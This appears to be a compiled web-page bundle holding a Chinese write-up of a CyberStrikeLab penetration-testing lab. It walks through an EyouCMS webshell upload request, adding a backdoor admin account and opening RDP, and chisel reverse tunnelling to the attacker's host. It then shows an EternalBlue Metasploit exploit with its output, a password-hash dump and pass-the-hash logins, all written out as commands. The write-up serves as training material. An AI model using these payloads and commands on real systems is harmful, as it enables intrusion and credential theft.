"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[14085],{93922:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>t,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"Independent-Environment/CyberStrikeLab/Scene/lab01/index","title":"lab01","description":"\u573a\u666f\u4ecb\u7ecd","source":"@site/docs/Independent-Environment/CyberStrikeLab/Scene/lab01/index.md","sourceDirName":"Independent-Environment/CyberStrikeLab/Scene/lab01","slug":"/Independent-Environment/CyberStrikeLab/Scene/lab01/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab01/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CyberStrikeLab/Scene/lab01/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Windmill","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/Windmill/"},"next":{"title":"lab02","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab02/"}}');var s=r(74848),l=r(28453);const a={},t="lab01",d={},c=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2},{value:"EyouCms RCE",id:"eyoucms-rce",level:2},{value:"flag - 1",id:"flag---1",level:2},{value:"\u5165\u53e3\u673a - WIN-KOHRC1DGOL9 - \u4fe1\u606f\u6536\u96c6",id:"\u5165\u53e3\u673a---win-kohrc1dgol9---\u4fe1\u606f\u6536\u96c6",level:2},{value:"WIN-KOHRC1DGOL9 - \u5f00\u542f RDP",id:"win-kohrc1dgol9---\u5f00\u542f-rdp",level:2},{value:"WIN-KOHRC1DGOL9 - \u5efa\u7acb\u4ee3\u7406\u67a2\u7ebd",id:"win-kohrc1dgol9---\u5efa\u7acb\u4ee3\u7406\u67a2\u7ebd",level:2},{value:"\u4e8c\u5c42\u5185\u7f51\u626b\u63cf",id:"\u4e8c\u5c42\u5185\u7f51\u626b\u63cf",level:2},{value:"WIN-7NRTJO59O7N - MS17-010",id:"win-7nrtjo59o7n---ms17-010",level:2},{value:"flag - 3",id:"flag---3",level:2},{value:"WIN-7NRTJO59O7N - \u6293\u53d6\u54c8\u5e0c",id:"win-7nrtjo59o7n---\u6293\u53d6\u54c8\u5e0c",level:2},{value:"cyberweb - PTH",id:"cyberweb---pth",level:2},{value:"flag - 2",id:"flag---2",level:2}];function o(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,l.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"lab01",children:"lab01"})}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"\u573a\u666f\u4ecb\u7ecd"}),(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u672c\u6b21\u5c0f\u674e\u7684\u4efb\u52a1\u662f\u653b\u514b 192.168.10.0/24 \u7f51\u6bb5\u7684\u6240\u6709\u4e3b\u673a\uff0c\u521a\u5f00\u59cb\u633a\u987a\u5229\uff0c\u4f46\u6df1\u5165\u540e\u53d1\u73b0\u91cc\u9762\u7684\u60c5\u51b5\u8fdc\u6bd4\u60f3\u8c61\u7684\u590d\u6742\u3002"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u591a\u5c42\u4ee3\u7406"}),"\n",(0,s.jsx)(n.li,{children:"\u57df\u6e17\u900f"}),"\n",(0,s.jsx)(n.li,{children:"\u4eff\u771f\u5b9e\u6218"}),"\n",(0,s.jsx)(n.li,{children:"\u4fe1\u606f\u6536\u96c6"}),"\n"]}),"\n"]})]}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.10.10/\n"})}),"\n",(0,s.jsx)(n.h2,{id:"eyoucms-rce",children:"EyouCms RCE"}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u9875\u811a\u4fe1\u606f\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e3a EyouCms \u6846\u67b6"}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e\u6f0f\u6d1e\u4fe1\u606f\uff0c\u53ef\u4ee5\u68c0\u7d22\u5230 ",(0,s.jsx)(n.a,{href:"https://hu3sky.github.io/2018/08/25/eyou%C7%B0%CC%A8getshell/",children:"eyoucms \u524d\u53f0 getshell \u590d\u73b0\u30fbHu3sky's blog"})]}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u590d\u73b0\u6587\u7ae0\uff0c\u6784\u5efa\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(60607).A+"",width:"1838",height:"1191"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"POST /index.php/api/Uploadify/preview HTTP/1.1\nHost: 192.168.10.10\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\n\ndata:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSkgPz4=\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u6210\u529f\u4e0a\u4f20 webshell"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(97030).A+"",width:"1542",height:"1040"})}),"\n",(0,s.jsx)(n.h2,{id:"flag---1",children:"flag - 1"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 C \u76d8\u6839\u76ee\u5f55\u5373\u53ef\u53d1\u73b0 ",(0,s.jsx)(n.code,{children:"flag.txt"})," \u6587\u4ef6"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(72031).A+"",width:"1542",height:"1040"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u673a---win-kohrc1dgol9---\u4fe1\u606f\u6536\u96c6",children:"\u5165\u53e3\u673a - WIN-KOHRC1DGOL9 - \u4fe1\u606f\u6536\u96c6"}),"\n",(0,s.jsx)(n.p,{children:"\u83b7\u53d6\u57fa\u7840\u4fe1\u606f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"C:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> whoami\nnt authority\\system\n\nC:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> systeminfo\n\u4e3b\u673a\u540d:           WIN-KOHRC1DGOL9\nOS \u540d\u79f0:          Microsoft Windows Server 2012 R2 Standard\nOS \u7248\u672c:          6.3.9600 \u6682\u7f3a Build 9600\nOS \u5236\u9020\u5546:        Microsoft Corporation\nOS \u914d\u7f6e:          \u72ec\u7acb\u670d\u52a1\u5668\nOS \u6784\u4ef6\u7c7b\u578b:      Multiprocessor Free\n\u6ce8\u518c\u7684\u6240\u6709\u4eba:     Windows \u7528\u6237\n\u6ce8\u518c\u7684\u7ec4\u7ec7:       \n\u4ea7\u54c1 ID:          00252-60020-02714-AA020\n\u521d\u59cb\u5b89\u88c5\u65e5\u671f:     2025/1/6, 11:21:56\n\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4:     2025/10/25, 10:32:01\n\u7cfb\u7edf\u5236\u9020\u5546:       Red Hat\n\u7cfb\u7edf\u578b\u53f7:         KVM\n\u7cfb\u7edf\u7c7b\u578b:         x64-based PC\n\u5904\u7406\u5668:           \u5b89\u88c5\u4e86 1 \u4e2a\u5904\u7406\u5668\u3002\n                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2000 Mhz\nBIOS \u7248\u672c:        SeaBIOS 1.16.3-2.el9, 2014/4/1\nWindows \u76ee\u5f55:     C:\\Windows\n\u7cfb\u7edf\u76ee\u5f55:         C:\\Windows\\system32\n\u542f\u52a8\u8bbe\u5907:         \\Device\\HarddiskVolume1\n\u7cfb\u7edf\u533a\u57df\u8bbe\u7f6e:     zh-cn;\u4e2d\u6587(\u4e2d\u56fd)\n\u8f93\u5165\u6cd5\u533a\u57df\u8bbe\u7f6e:   zh-cn;\u4e2d\u6587(\u4e2d\u56fd)\n\u65f6\u533a:             (UTC+08:00)\u5317\u4eac\uff0c\u91cd\u5e86\uff0c\u9999\u6e2f\u7279\u522b\u884c\u653f\u533a\uff0c\u4e4c\u9c81\u6728\u9f50\n\u7269\u7406\u5185\u5b58\u603b\u91cf:     1,023 MB\n\u53ef\u7528\u7684\u7269\u7406\u5185\u5b58:   448 MB\n\u865a\u62df\u5185\u5b58: \u6700\u5927\u503c: 2,047 MB\n\u865a\u62df\u5185\u5b58: \u53ef\u7528:   1,111 MB\n\u865a\u62df\u5185\u5b58: \u4f7f\u7528\u4e2d: 936 MB\n\u9875\u9762\u6587\u4ef6\u4f4d\u7f6e:     C:\\pagefile.sys\n\u57df:               WORKGROUP\n\u767b\u5f55\u670d\u52a1\u5668:       \u6682\u7f3a\n\u4fee\u8865\u7a0b\u5e8f:         \u5b89\u88c5\u4e86 6 \u4e2a\u4fee\u8865\u7a0b\u5e8f\u3002\n                  [01]: KB2919355\n                  [02]: KB2919442\n                  [03]: KB2937220\n                  [04]: KB2938772\n                  [05]: KB2939471\n                  [06]: KB2949621\n\u7f51\u5361:             \u5b89\u88c5\u4e86 2 \u4e2a NIC\u3002\n                  [01]: Realtek RTL8139C+ Fast Ethernet NIC\n                      \u8fde\u63a5\u540d:      \u4ee5\u592a\u7f51\u5b9e\u4f8b 0\n                      \u542f\u7528 DHCP:   \u5426\n                      IP \u5730\u5740\n                        [01]: 192.168.20.10\n                        [02]: fe80::41ee:c39e:b973:970d\n                  [02]: Realtek RTL8139C+ Fast Ethernet NIC\n                      \u8fde\u63a5\u540d:      \u4ee5\u592a\u7f51 3\n                      \u542f\u7528 DHCP:   \u5426\n                      IP \u5730\u5740\n                        [01]: 192.168.10.10\n                        [02]: fe80::411e:4da2:6bef:f909\nHyper-V \u8981\u6c42:     \u5df2\u68c0\u6d4b\u5230\u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u3002\u5c06\u4e0d\u663e\u793a Hyper-V \u6240\u9700\u7684\u529f\u80fd\u3002\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u6ce8\u610f\u5230\u5165\u53e3\u673a\u662f\u4e00\u53f0\u53cc\u7f51\u5361\u673a\u5668"}),"\n",(0,s.jsx)(n.h2,{id:"win-kohrc1dgol9---\u5f00\u542f-rdp",children:"WIN-KOHRC1DGOL9 - \u5f00\u542f RDP"}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e web \u670d\u52a1\u6743\u9650\u5c31\u662f SYSTEM \u6240\u4ee5\u76f4\u63a5\u6dfb\u52a0\u7528\u6237"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-cmd",children:"net user randark Admin123### /add\nnet localgroup administrators randark /add\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u5f00\u542f RDP \u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall set rule group="remote desktop" new enable=yes\nnet start termservice\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u901a\u8fc7 RDP \u8fde\u63a5\u5165\u53e3\u673a\uff0c\u53ef\u4ee5\u770b\u5230\u62a5\u9519\u4fe1\u606f"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(68671).A+"",width:"582",height:"492"})}),"\n",(0,s.jsx)(n.p,{children:"\u7981\u7528\u6389\u8eab\u4efd\u9a8c\u8bc1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f \n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u8fdb\u5165\u5165\u53e3\u673a\u7684 RDP"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:r(3914).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.h2,{id:"win-kohrc1dgol9---\u5efa\u7acb\u4ee3\u7406\u67a2\u7ebd",children:"WIN-KOHRC1DGOL9 - \u5efa\u7acb\u4ee3\u7406\u67a2\u7ebd"}),"\n",(0,s.jsx)(n.p,{children:"\u5728 kali \u4e0a\u542f\u52a8\u76d1\u542c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~/tools/chisel_v1.11.3]\n\u2514\u2500$ ./chisel_1.11.3_linux_amd64 server -p 1337 --reverse\n2025/10/25 18:59:27 server: Reverse tunnelling enabled\n2025/10/25 18:59:27 server: Fingerprint bqwFYMM1F57P0eCkvFetOz8+nOevFcw7Cx4Ej1sRXXw=\n2025/10/25 18:59:27 server: Listening on http://0.0.0.0:1337\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 ",(0,s.jsx)(n.code,{children:"WIN-KOHRC1DGOL9"})," \u4e0a\u6267\u884c"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"chisel.exe client 172.16.233.2:1337 R:0.0.0.0:10000:socks\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5efa\u7acb\u4ee3\u7406"}),"\n",(0,s.jsx)(n.h2,{id:"\u4e8c\u5c42\u5185\u7f51\u626b\u63cf",children:"\u4e8c\u5c42\u5185\u7f51\u626b\u63cf"}),"\n",(0,s.jsxs)(n.p,{children:["\u7531\u4e8e ",(0,s.jsx)(n.code,{children:"WIN-KOHRC1DGOL9"})," \u4e3b\u673a\u5b8c\u5168\u53ef\u63a7\uff0c\u76f4\u63a5\u5728\u4e0a\u9762\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"fscan.exe -h 192.168.20.0/24\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"192.168.20.20:445 open\n192.168.20.10:445 open\n192.168.20.10:80 open\n192.168.20.30:88 open\n192.168.20.10:3306 open\n192.168.20.30:445 open\n192.168.20.30:139 open\n192.168.20.20:139 open\n192.168.20.10:139 open\n192.168.20.30:135 open\n192.168.20.20:135 open\n192.168.20.10:135 open\n[+] MS17-010 192.168.20.30 (Windows Server 2008 R2 Standard 7600)\n[*] NetBios 192.168.20.10   WORKGROUP\\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600\n[*] NetInfo \n[*]192.168.20.20\n   [->]cyberweb\n   [->]192.168.20.20\n[*] NetInfo \n[*]192.168.20.30\n   [->]WIN-7NRTJO59O7N\n   [->]192.168.20.30\n[+] MS17-010 192.168.20.20 (Windows Server 2012 R2 Standard 9600)\n[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[*] WebTitle http://192.168.20.10      code:200 len:25229  title:\u6613\u4f18CMS -  Powered by Eyoucms.com\n[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\uff0c\u53e6\u5916\u4e24\u53f0\u4e3b\u673a\u90fd\u53ef\u4ee5\u76f4\u63a5\u6253 MS17-010"}),"\n",(0,s.jsx)(n.h2,{id:"win-7nrtjo59o7n---ms17-010",children:"WIN-7NRTJO59O7N - MS17-010"}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u662f\u9776\u573a\uff0c\u76f4\u63a5\u4f7f\u7528 MSF \u6765\u6253"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf > use exploit/windows/smb/ms17_010_eternalblue\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf exploit(windows/smb/ms17_010_eternalblue) > setg lhost 172.16.233.2\nlhost => 172.16.233.2\nmsf exploit(windows/smb/ms17_010_eternalblue) > setg lport 3000\nlport => 3000\nmsf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.20.30\nrhosts => 192.168.20.30\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\u4e3a\u4e86\u907f\u514d\u4e0d\u51fa\u7f51\u7684\u60c5\u51b5\uff0c\u5c06 kali \u4e0a\u7684 3000 \u7aef\u53e3\u8f6c\u53d1\u5230 ",(0,s.jsx)(n.code,{children:"WIN-KOHRC1DGOL9"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"chisel.exe client 172.16.233.2:1337 3000:0.0.0.0:3000\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5e76\u4e14\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684 lhost \u53c2\u6570"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf exploit(windows/smb/ms17_010_eternalblue) > setg lhost 192.168.20.10\nlhost => 172.16.233.2\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5f00\u59cb\u653b\u51fb"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf exploit(windows/smb/ms17_010_eternalblue) > exploit \n[-] Handler failed to bind to 192.168.20.10:3000:-  -\n[*] Started reverse TCP handler on 0.0.0.0:3000 \n[*] 192.168.20.30:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 192.168.20.30:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)\n/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression\n[*] 192.168.20.30:445     - Scanned 1 of 1 hosts (100% complete)\n[+] 192.168.20.30:445 - The target is vulnerable.\n[*] 192.168.20.30:445 - Connecting to target for exploitation.\n[+] 192.168.20.30:445 - Connection established for exploitation.\n[+] 192.168.20.30:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 192.168.20.30:445 - CORE raw buffer dump (36 bytes)\n[*] 192.168.20.30:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2\n[*] 192.168.20.30:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard \n[*] 192.168.20.30:445 - 0x00000020  37 36 30 30                                      7600            \n[+] 192.168.20.30:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 192.168.20.30:445 - Trying exploit with 12 Groom Allocations.\n[*] 192.168.20.30:445 - Sending all but last fragment of exploit packet\n[*] 192.168.20.30:445 - Starting non-paged pool grooming\n[+] 192.168.20.30:445 - Sending SMBv2 buffers\n[+] 192.168.20.30:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 192.168.20.30:445 - Sending final SMBv2 buffers.\n[*] 192.168.20.30:445 - Sending last fragment of exploit packet!\n[*] 192.168.20.30:445 - Receiving response from exploit packet\n[+] 192.168.20.30:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 192.168.20.30:445 - Sending egg to corrupted connection.\n[*] 192.168.20.30:445 - Triggering free of corrupted buffer.\n[*] Sending stage (203846 bytes) to 127.0.0.1\n[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[*] Meterpreter session 1 opened (127.0.0.1:3000 -> 127.0.0.1:46162) at 2025-10-25 19:19:11 +0800\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > sysinfo \nComputer        : WIN-7NRTJO59O7N\nOS              : Windows Server 2008 R2 (6.1 Build 7600).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : CYBERSTRIKELAB\nLogged On Users : 1\nMeterpreter     : x64/windows\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5b9a\u4f4d ",(0,s.jsx)(n.code,{children:"flag.txt"})," \u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > pwd\nC:\\\nmeterpreter > ls\nListing: C:\\\n============\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n040777/rwxrwxrwx  0      dir   2009-07-14 10:34:39 +0800  $Recycle.Bin\n040777/rwxrwxrwx  0      dir   2009-07-14 13:06:44 +0800  Documents and Settings\n040777/rwxrwxrwx  0      dir   2009-07-14 11:20:08 +0800  PerfLogs\n040555/r-xr-xr-x  4096   dir   2024-12-22 11:29:23 +0800  Program Files\n040555/r-xr-xr-x  4096   dir   2024-12-22 11:29:26 +0800  Program Files (x86)\n040777/rwxrwxrwx  4096   dir   2024-12-22 11:36:27 +0800  ProgramData\n040777/rwxrwxrwx  0      dir   2024-12-22 11:27:05 +0800  Recovery\n040777/rwxrwxrwx  4096   dir   2024-12-22 11:29:38 +0800  System Volume Information\n040555/r-xr-xr-x  4096   dir   2024-12-22 11:27:36 +0800  Users\n040777/rwxrwxrwx  16384  dir   2024-12-22 11:31:57 +0800  Windows\n100666/rw-rw-rw-  25     fil   2024-12-30 12:15:34 +0800  flag.txt\n000000/---------  0      fif   1970-01-01 08:00:00 +0800  pagefile.sys\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag---3",children:"flag - 3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > cat C:\\flag.txt\ngo-flag{R0M4QwsS6EQp97lw}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"win-7nrtjo59o7n---\u6293\u53d6\u54c8\u5e0c",children:"WIN-7NRTJO59O7N - \u6293\u53d6\u54c8\u5e0c"}),"\n",(0,s.jsxs)(n.p,{children:["\u5077\u61d2\u4e86\uff0c\u76f4\u63a5 ",(0,s.jsx)(n.code,{children:"hashdump"})," \u4e86\uff0c\u672c\u6765\u5e94\u8be5\u6dfb\u52a0\u7528\u6237 rdp \u4e0a\u53bb\uff0c\u518d\u8fd0\u884c mimikatz \u7a0b\u5e8f\u6293\u53d6\u54c8\u5e0c\uff0c\u4f46\u662f\u90fd\u5dee\u4e0d\u591a\u4e86"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > hashdump \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::\ncyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::\nWIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:bfbb7395227fcded73330cf71f8e034b:::\nCYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:cd61fef6f1c209f7263b40ad1a2c28e4:::\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u5c1d\u8bd5 pth \u76f4\u63a5\u5229\u7528\u54c8\u5e0c"}),"\n",(0,s.jsx)(n.h2,{id:"cyberweb---pth",children:"cyberweb - PTH"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ proxychains nxc smb 192.168.20.20 -d CYBERSTRIKELAB -u Administrator -H 94bd5248e87cb7f2f9b871d40c903927\nSMB         192.168.20.20   445    CYBERWEB         [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) \nSMB         192.168.20.20   445    CYBERWEB         [+] CYBERSTRIKELAB\\Administrator:94bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6216\u8005\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"impacke-smbexec"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ proxychains -q impacket-smbexec cyberstrikelab.com/Administrator@192.168.20.20 -hashes aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927 -codec gbk\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32>whoami\nnt authority\\system\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag---2",children:"flag - 2"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"C:\\Windows\\system32>type C:\\flag.txt\ngo-flag{Nb8VOT8X9SbIzyDI}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}},60607:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/image_20251046-184654-0159e22036c40660a998a36d2f606152.png"},97030:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/image_20251047-184731-2e7467e598f39b27180974ae84298ac1.png"},72031:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/image_20251048-184814-3d06fb67e4377d3b18c295378076368a.png"},68671:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/image_20251055-185543-29ab10c8f3e22d26f3dc30d873459f04.png"},3914:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/image_20251058-185800-65008da90bf2cfb95b65d4d78a61168c.png"},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>t});var i=r(96540);const s={},l=i.createContext(s);function a(e){const n=i.useContext(l);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);